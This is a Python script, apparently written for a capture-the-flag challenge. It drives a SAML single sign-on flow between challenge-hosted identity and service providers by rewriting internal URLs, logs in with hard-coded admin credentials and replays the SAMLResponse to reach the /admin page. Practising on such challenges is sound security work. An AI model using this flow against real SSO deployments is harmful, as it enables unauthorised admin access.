import urllib.request, urllib.parse, http.cookiejar, re, html

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

SP = "http://oj-10-30-15-1-44153.adworld.xctf.org.cn"
IDP = "http://oj-10-30-15-1-56469.adworld.xctf.org.cn"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect)
opener.addheaders = [('User-Agent','Mozilla/5.0')]

def req(url, data=None):
    body = urllib.parse.urlencode(data).encode() if data else None
    r = urllib.request.Request(url, data=body)
    try:
        resp = opener.open(r, timeout=25)
        return resp.getcode(), dict(resp.headers), resp.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf-8','replace')

def to_idp(url):
    # internal idp sso referenced as 127.0.0.1:80/saml/sso
    url = re.sub(r'http://127\.0\.0\.1:80/saml/sso', IDP + '/saml/sso', url)
    url = re.sub(r'http://127\.0\.0\.1/saml/sso', IDP + '/saml/sso', url)
    url = re.sub(r'http://localhost(:\d+)?/saml/sso', IDP + '/saml/sso', url)
    url = re.sub(r'https?://idp(:\d+)?', IDP, url)
    return url

def to_sp(url):
    url = re.sub(r'http://127\.0\.0\.1:26000', SP, url)
    url = re.sub(r'http://127\.0\.0\.1:80', SP, url)
    url = re.sub(r'http://127\.0\.0\.1', SP, url)
    url = re.sub(r'http://localhost(:\d+)?', SP, url)
    url = re.sub(r'https?://sp(:\d+)?', SP, url)
    return url

c, h, b = req(SP + "/saml/login")
sso_url = to_idp(h.get("Location",""))
print("SP login ->", c, sso_url[:90])
c, h, b = req(sso_url)
loc2 = h.get("Location","")
print("IdP sso ->", c, loc2[:90])
if loc2.startswith("/"):
    loc2 = IDP + loc2
q = urllib.parse.parse_qs(urllib.parse.urlparse(loc2).query)
samlRequest = q["SAMLRequest"][0]; relayState = q.get("RelayState",["/"])[0]
c, h, b = req(IDP + "/login?" + urllib.parse.urlencode({"SAMLRequest":samlRequest,"RelayState":relayState}))
samlRequest = html.unescape(re.search(r'name="samlRequest"\s+value="([^"]+)"', b).group(1))
relayState = html.unescape(re.search(r'name="relayState"\s+value="([^"]+)"', b).group(1))
c, h, b = req(IDP + "/login", {"samlRequest":samlRequest,"relayState":relayState,"username":"admin","password":"RCTF2025"})
print("login:", c, h.get("Location","")[:90])
sso_loc = h.get("Location","")
if sso_loc.startswith("/"):
    sso_loc = IDP + sso_loc
else:
    sso_loc = to_idp(sso_loc)
c, h, b = req(sso_loc)
print("sso form code:", c)
action = re.search(r'action="([^"]+)"', b)
sresp = re.search(r'name="SAMLResponse"\s+value="([^"]+)"', b)
rstate = re.search(r'name="RelayState"\s+value="([^"]+)"', b)
acs = to_sp(action.group(1)) if action else (SP + "/saml/acs")
print("ACS action:", acs)
SAMLResponse = html.unescape(sresp.group(1)) if sresp else None
RelayState = html.unescape(rstate.group(1)) if rstate else "/admin"
print("SAMLResponse len:", len(SAMLResponse) if SAMLResponse else 0)
c, h, b = req(acs, {"SAMLResponse":SAMLResponse, "RelayState":RelayState})
print("ACS code:", c, "loc:", h.get("Location"))
print("ACS body head:", b[:300])
nxt = h.get("Location")
if nxt:
    nxt = nxt if nxt.startswith("http") else SP + nxt
    nxt = to_sp(nxt)
else:
    nxt = SP + "/admin"
c, h, b = req(nxt)
print("after ACS:", c)
print(b[:2000])
